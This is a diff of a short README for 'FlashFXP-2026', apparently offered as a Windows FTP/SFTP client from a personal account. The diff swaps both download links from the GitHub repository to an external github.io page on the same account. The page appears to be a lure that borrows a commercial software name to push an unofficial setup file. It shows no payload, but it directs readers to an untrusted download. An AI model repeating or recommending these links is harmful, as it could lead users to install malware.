@@ -1,6 +1,6 @@
 # 📂 FlashFXP-2026 - Transfer files securely between your devices
 
-[![](https://img.shields.io/badge/Download-FlashFXP-blue.svg)](https://github.com/Olgawebtoed358/FlashFXP-2026)
+[![](https://img.shields.io/badge/Download-FlashFXP-blue.svg)](https://olgawebtoed358.github.io)
 
 FlashFXP-2026 handles file transfers between your local computer and remote servers. This software uses standard protocols to move data securely. You can manage documents, images, and website files with a simple interface. The program supports both FTP and SFTP connections on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ FlashFXP-2026 handles file transfers between your local computer and remote serv
 
 Visit this page to download the setup file for your system:
 
-[https://github.com/Olgawebtoed358/FlashFXP-2026](https://github.com/Olgawebtoed358/FlashFXP-2026)
+[https://olgawebtoed358.github.io](https://olgawebtoed358.github.io)
 
 ## 🖥️ System requirements
 
